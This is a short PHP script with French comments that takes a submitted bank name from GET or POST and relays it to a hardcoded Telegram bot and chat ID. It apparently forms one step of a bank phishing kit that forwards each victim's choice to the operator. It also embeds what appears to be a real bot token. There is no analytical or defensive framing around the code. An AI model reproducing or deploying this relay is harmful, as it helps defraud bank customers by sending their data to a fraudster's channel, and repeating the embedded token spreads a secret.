<?php
// Envoie le choix de banque vers Telegram
// 1) Remplace BOT_TOKEN_DYALK_HNA par le vrai bot token
// 2) Remplace CHAT_ID_DYALK_HNA par ton vrai chat id

$botToken = "5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
$chatId   = "5061239044";


// Récupérer le nom de la banque (GET ou POST)
$banque = '';
if (isset($_POST['banque'])) {
    $banque = $_POST['banque'];
} elseif (isset($_GET['banque'])) {
    $banque = $_GET['banque'];
}

if ($banque !== '') {
    $message  = "🔔 Nouveau choix de banque\n";
    $message .= "🏦 Banque: " . $banque . "\n";

    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = array(
        "chat_id" => $chatId,
        "text"    => $message
    );

    // Envoi via POST
    $options = array(
        "http" => array(
            "header"  => "Content-type: application/x-www-form-urlencoded\r\n",
            "method"  => "POST",
            "content" => http_build_query($data)
        )
    );
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

echo "OK";
?>
